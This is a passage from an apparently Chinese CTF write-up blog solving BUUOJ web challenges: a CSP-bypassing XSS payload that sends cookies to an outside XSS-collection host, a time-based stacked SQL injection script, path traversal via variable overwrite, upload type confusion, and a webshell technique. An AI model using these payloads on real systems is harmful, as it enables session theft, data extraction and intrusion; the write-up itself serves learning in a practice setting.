<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-security-policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert（1）<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p>通过Fuzz ,我们发现英文小括号被换成中文的了，“=”被替换成了中文“等于号” 等等，说明后端有保护机制，不过虽然头大，我们却可以用<strong>markup编码的方式绕过</strong>（就是我们喜闻乐见的&amp;#编码） HTML Markup: <a target="_blank" rel="noopener" href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html">https://www.w3.org/MarkUp/html-spec/html-spec_13.html</a></p>
<p>再看之前的源代码<br><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu31.png"><br>它有个CSP内容安全策略的存在，<a href="https://www.cnblogs.com/heyuqing/p/6215761.html" target="_blank">CSP内容安全策略详解</a></p>
<blockquote>
<p><strong>CSP全称Content Security Policy ,可以直接翻译为内容安全策略,说白了,就是为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规责指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程的资源）。通过CSP协定，让WEB处于一个安全的运行环境中。</strong></p>
<p><strong>通过csp我们可以制定一系列的策略,从而只允许我们页面向我们允许的域名发起跨域请求,而不符合我们策略的恶意攻击则被挡在门外</strong></p>
</blockquote>
<p>它开启了’unsafe-eval’，所以我们可以用eval来执行我们的代码</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu32.jpg"></p>
<p>所以，我们的payload为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">in_str =<span class="string">&quot;(function()&#123;window.location.href=&#x27;http://xss.buuoj.cn/index.php?do=api&amp;id=qIiHBg&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return &#x27;&#x27;&#125;&#125;)());&#125;)();&quot;</span></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> in_str:</span><br><span class="line">    output += <span class="string">&quot;&amp;#&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(c))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot;</span> + output + <span class="string">&quot;&amp;#34&amp;#41&lt;/script&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;svg&gt;</span><span class="section">&lt;script&gt;</span><span class="attribute">eval</span>&amp;#<span class="number">40</span>&amp;#<span class="number">34</span>&amp;#<span class="number">40</span>&amp;#<span class="number">102</span>&amp;#<span class="number">117</span>&amp;#<span class="number">110</span>&amp;#<span class="number">99</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">119</span>&amp;#<span class="number">105</span>&amp;#<span class="number">110</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">119</span>&amp;#<span class="number">46</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">46</span>&amp;#<span class="number">104</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">102</span>&amp;#<span class="number">61</span>&amp;#<span class="number">39</span>&amp;#<span class="number">104</span>&amp;#<span class="number">116</span>&amp;#<span class="number">116</span>&amp;#<span class="number">112</span>&amp;#<span class="number">58</span>&amp;#<span class="number">47</span>&amp;#<span class="number">47</span>&amp;#<span class="number">120</span>&amp;#<span class="number">115</span>&amp;#<span class="number">115</span>&amp;#<span class="number">46</span>&amp;#<span class="number">98</span>&amp;#<span class="number">117</span>&amp;#<span class="number">117</span>&amp;#<span class="number">111</span>&amp;#<span class="number">106</span>&amp;#<span class="number">46</span>&amp;#<span class="number">99</span>&amp;#<span class="number">110</span>&amp;#<span class="number">47</span>&amp;#<span class="number">105</span>&amp;#<span class="number">110</span>&amp;#<span class="number">100</span>&amp;#<span class="number">101</span>&amp;#<span class="number">120</span>&amp;#<span class="number">46</span>&amp;#<span class="number">112</span>&amp;#<span class="number">104</span>&amp;#<span class="number">112</span>&amp;#<span class="number">63</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">61</span>&amp;#<span class="number">97</span>&amp;#<span class="number">112</span>&amp;#<span class="number">105</span>&amp;#<span class="number">38</span>&amp;#<span class="number">105</span>&amp;#<span class="number">100</span>&amp;#<span class="number">61</span>&amp;#<span class="number">113</span>&amp;#<span class="number">73</span>&amp;#<span class="number">105</span>&amp;#<span class="number">72</span>&amp;#<span class="number">66</span>&amp;#<span class="number">103</span>&amp;#<span class="number">38</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">61</span>&amp;#<span class="number">39</span>&amp;#<span class="number">43</span>&amp;#<span class="number">101</span>&amp;#<span class="number">115</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">40</span>&amp;#<span class="number">40</span>&amp;#<span class="number">102</span>&amp;#<span class="number">117</span>&amp;#<span class="number">110</span>&amp;#<span class="number">99</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">116</span>&amp;#<span class="number">114</span>&amp;#<span class="number">121</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">117</span>&amp;#<span class="number">109</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">116</span>&amp;#<span class="number">46</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">46</span>&amp;#<span class="number">104</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">102</span>&amp;#<span class="number">125</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">99</span>&amp;#<span class="number">104</span>&amp;#<span class="number">40</span>&amp;#<span class="number">101</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">39</span>&amp;#<span class="number">39</span>&amp;#<span class="number">125</span>&amp;#<span class="number">125</span>&amp;#<span class="number">41</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">41</span>&amp;#<span class="number">43</span>&amp;#<span class="number">39</span>&amp;#<span class="number">38</span>&amp;#<span class="number">116</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">61</span>&amp;#<span class="number">39</span>&amp;#<span class="number">43</span>&amp;#<span class="number">101</span>&amp;#<span class="number">115</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">40</span>&amp;#<span class="number">40</span>&amp;#<span class="number">102</span>&amp;#<span class="number">117</span>&amp;#<span class="number">110</span>&amp;#<span class="number">99</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">116</span>&amp;#<span class="number">114</span>&amp;#<span class="number">121</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">116</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">46</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">46</span>&amp;#<span class="number">104</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">102</span>&amp;#<span class="number">125</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">99</span>&amp;#<span class="number">104</span>&amp;#<span class="number">40</span>&amp;#<span class="number">101</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">39</span>&amp;#<span class="number">39</span>&amp;#<span class="number">125</span>&amp;#<span class="number">125</span>&amp;#<span class="number">41</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">41</span>&amp;#<span class="number">43</span>&amp;#<span class="number">39</span>&amp;#<span class="number">38</span>&amp;#<span class="number">99</span>&amp;#<span class="number">111</span>&amp;#<span class="number">111</span>&amp;#<span class="number">107</span>&amp;#<span class="number">105</span>&amp;#<span class="number">101</span>&amp;#<span class="number">61</span>&amp;#<span class="number">39</span>&amp;#<span class="number">43</span>&amp;#<span class="number">101</span>&amp;#<span class="number">115</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">40</span>&amp;#<span class="number">40</span>&amp;#<span class="number">102</span>&amp;#<span class="number">117</span>&amp;#<span class="number">110</span>&amp;#<span class="number">99</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">116</span>&amp;#<span class="number">114</span>&amp;#<span class="number">121</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">117</span>&amp;#<span class="number">109</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">116</span>&amp;#<span class="number">46</span>&amp;#<span class="number">99</span>&amp;#<span class="number">111</span>&amp;#<span class="number">111</span>&amp;#<span class="number">107</span>&amp;#<span class="number">105</span>&amp;#<span class="number">101</span>&amp;#<span class="number">125</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">99</span>&amp;#<span class="number">104</span>&amp;#<span class="number">40</span>&amp;#<span class="number">101</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">39</span>&amp;#<span class="number">39</span>&amp;#<span class="number">125</span>&amp;#<span class="number">125</span>&amp;#<span class="number">41</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">41</span>&amp;#<span class="number">43</span>&amp;#<span class="number">39</span>&amp;#<span class="number">38</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">101</span>&amp;#<span class="number">114</span>&amp;#<span class="number">61</span>&amp;#<span class="number">39</span>&amp;#<span class="number">43</span>&amp;#<span class="number">101</span>&amp;#<span class="number">115</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">40</span>&amp;#<span class="number">40</span>&amp;#<span class="number">102</span>&amp;#<span class="number">117</span>&amp;#<span class="number">110</span>&amp;#<span class="number">99</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">116</span>&amp;#<span class="number">114</span>&amp;#<span class="number">121</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">40</span>&amp;#<span class="number">119</span>&amp;#<span class="number">105</span>&amp;#<span class="number">110</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">119</span>&amp;#<span class="number">46</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">101</span>&amp;#<span class="number">114</span>&amp;#<span class="number">32</span>&amp;#<span class="number">38</span>&amp;#<span class="number">38</span>&amp;#<span class="number">32</span>&amp;#<span class="number">119</span>&amp;#<span class="number">105</span>&amp;#<span class="number">110</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">119</span>&amp;#<span class="number">46</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">101</span>&amp;#<span class="number">114</span>&amp;#<span class="number">46</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">46</span>&amp;#<span class="number">104</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">102</span>&amp;#<span class="number">41</span>&amp;#<span class="number">63</span>&amp;#<span class="number">119</span>&amp;#<span class="number">105</span>&amp;#<span class="number">110</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">119</span>&amp;#<span class="number">46</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">101</span>&amp;#<span class="number">114</span>&amp;#<span class="number">46</span>&amp;#<span class="number">108</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">105</span>&amp;#<span class="number">111</span>&amp;#<span class="number">110</span>&amp;#<span class="number">46</span>&amp;#<span class="number">104</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">102</span>&amp;#<span class="number">58</span>&amp;#<span class="number">39</span>&amp;#<span class="number">39</span>&amp;#<span class="number">125</span>&amp;#<span class="number">99</span>&amp;#<span class="number">97</span>&amp;#<span class="number">116</span>&amp;#<span class="number">99</span>&amp;#<span class="number">104</span>&amp;#<span class="number">40</span>&amp;#<span class="number">101</span>&amp;#<span class="number">41</span>&amp;#<span class="number">123</span>&amp;#<span class="number">114</span>&amp;#<span class="number">101</span>&amp;#<span class="number">116</span>&amp;#<span class="number">117</span>&amp;#<span class="number">114</span>&amp;#<span class="number">110</span>&amp;#<span class="number">32</span>&amp;#<span class="number">39</span>&amp;#<span class="number">39</span>&amp;#<span class="number">125</span>&amp;#<span class="number">125</span>&amp;#<span class="number">41</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">41</span>&amp;#<span class="number">59</span>&amp;#<span class="number">125</span>&amp;#<span class="number">41</span>&amp;#<span class="number">40</span>&amp;#<span class="number">41</span>&amp;#<span class="number">59</span>&amp;#<span class="number">34</span>&amp;#<span class="number">41</span>&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>至于为什么要加<svg>,原因如下</svg></p>
<p> <a href="http://bobao.360.cn/learning/detail/292.html" target="_blank">深入理解浏览器解析机制和XSS向量编码</a></p>
<p><a href="https://www.hackersb.cn/hacker/85.html#%E7%96%91%E9%97%" target="_blank">SVG XSS的一个黑魔法</a></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu33.jpg"></p>
<p>我们替换的&amp;#作为字符引用需要用外部元素进行解析，而<svg>恰好就为外部元素</svg></p>
<p>接下去将题目，在我们将payload投稿之后，到审查页面，验证码需要md5爆破，老套路了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>,<span class="number">100000000</span>):</span><br><span class="line">    md5_hack = hashlib.md5(<span class="built_in">str</span>(x).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> md5_hack[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&quot;9e0677&quot;</span>:</span><br><span class="line">        print(x)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>


<p>注意下这里的文件路径为<a target="_blank" rel="noopener" href="http://web.node3.buuoj.cn/post/xxxxxxxx">http://web.node3.buuoj.cn/post/xxxxxxxx</a></p>
<p>回到 <a target="_blank" rel="noopener" href="http://xss.buuoj.cn/">xss.buuoj.cn</a>  ，得到cookie ,修改cookie 到admin.php页面，进行常规联合注入即可得到flag</p>
<blockquote>
<p>-1 union select 1,flagg,3 from flag#</p>
</blockquote>
<h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>知识点：</p>
<ol>
<li><strong>预处理+时间注入 +hex转码</strong></li>
</ol>
<p>题目给了一个登录框，如果点击注册功能的话会弹窗注册功能未开放；如果随便输用户名点登录的话没有反应，抓包看看：</p>
<p><code>username</code>和<code>password</code>是用json格式发送的，并且会返回一段信息。先测试有没有注入点：我们尝试在username 后使用 “，发现报错了</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu34.jpg"></p>
<p>使用#闭合，发现返回200</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu35.jpg"></p>
<p>经过简单的手动fuzz之后发现没有办法进行联合查询（因为没有回显）和有Boolean回显的盲注，我猜可能是服务器全给WAF掉了，一般这种情况下可以考虑以下堆叠注入，所以我修改<code>username</code>为<code>123&#39;;</code>，结果发现回显正常：</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu36.jpg"></p>
<p>这样一来，可以推测拼接到服务器端的SQL语句就是：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#123;table_name&#125; where username=&#x27;123&#x27;;&#x27; and password=&#x27;123&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>因为;号表示一个SQL语句的结束，;号后面的一个’号被认为是下一个SQL语句的开始，所以没有产生报错，也就是说，这个题目是存在堆叠注入的（;号被解析了）</strong></p>
<p><strong>可以使用 时间盲注 + 堆叠注入+hex转码 进行注入，（在MySQL中0x开头的十六进制数会被转换成字符串，使用hex转码是为了绕过WAF）</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu37.jpg"></p>
<p>大佬写的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: c1e4r</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#题目地址</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;&#x27;http://e4b6b45e-5ca4-45ca-93c5-a16e3cf2fe5c.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#注入payload</span></span><br><span class="line">    payloads = <span class="string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="comment">#查询payload</span></span><br><span class="line">        payload = <span class="string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#将构造好的payload进行16进制转码和json转码</span></span><br><span class="line">            datas = &#123;<span class="string">&#x27;username&#x27;</span>:payloads.<span class="built_in">format</span>(str_to_hex(payload.<span class="built_in">format</span>(i,j))),<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;test213&#x27;</span>&#125;</span><br><span class="line">            print(datas)</span><br><span class="line">            data = json.dumps(datas)</span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(url = url, data = data)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">3</span>:</span><br><span class="line">                flag = flag + <span class="built_in">chr</span>(j)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>


<p>得到 </p>
<blockquote>
<p>glzjin_wants_a_girl_friend.zip</p>
</blockquote>
<p>下载得到源码，<del>本来以为注入出来就是flag</del></p>
<p>审计，代码很简单</p>
<p>总的流程为，通过UserController类 中 的 actionIndex 方法，把$_REQUEST这个数组赋值给了$listData，然后传入了loadView 方法</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu38.jpg"></p>
<p>而loadView 方法 恰好为 BaseController类中loadView方法的第二参数，这个第二参数进行了变量覆盖，而第一个参数进行一下路径的拼接得到一个php文件，然后直接包含该文件，因为传入<code>loadView</code>方法的第一个参数是<code>userIndex</code>，所以我们跟进<code>userIndex.php</code></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu38-2.jpg"></p>
<p>#userIndex :我们可以通过变量覆盖设置$img_file的值, 而该代码会将该变量所对应的文件内容进行b64编码处理</p>
<p>所以我们传参 img_file=../../../flag.php</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu39.jpg"></p>
<p>还有注意下 r 变量的值为 user/Index ,原因如下代码，会将r参数的值 按  / 进行分割，拼接，我们利用变量覆盖函数对应的控制器为userController ,所以传参 ?r=user/Index</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu40.jpg"></p>
<p>🆗 </p>
<p>payload:</p>
<blockquote>
<p>?r=User/Index&amp;img_file=../../flag.php</p>
</blockquote>
<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>知识点：FILEINFO + getimagesize</p>
<p>看下源码，主要部分在 <code>upload.php</code></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu41.jpg"></p>
<p>首先判断文件大小，并使用 <code>FILEINFO</code> 判断上传图片类型，上传图片只能是 png 类型<br>后面再用 <code>getimagesize</code> 判断文件像素大小，并且再进行一次类型判断，如果不是 png 类型就给出 flag</p>
<p><strong>在这两种判断上传图片类型的函数中，有一个很有趣的现象， <code>FILEINFO</code> 可以识别 png 图片( 十六进制下 )的第一行，而 <code>getimagesize</code> 不可以</strong></p>
<p>所以我们上传的文件内容如下</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu42.jpg"></p>
<p>上传即可得到flag</p>
<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p>知识点：<strong>利用汉字构造 shell</strong></p>
<p>审计代码，发现从传入文件内容的第6个字母开始黑名单匹配，fuzz被过滤字符</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu43.jpg"></p>
<p>只有这个几个是能用的了</p>
<p>利用方法，汉字构造shell，p神的文章里将的很详细了<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank">一些不包含数字和字母的webshell</a></p>
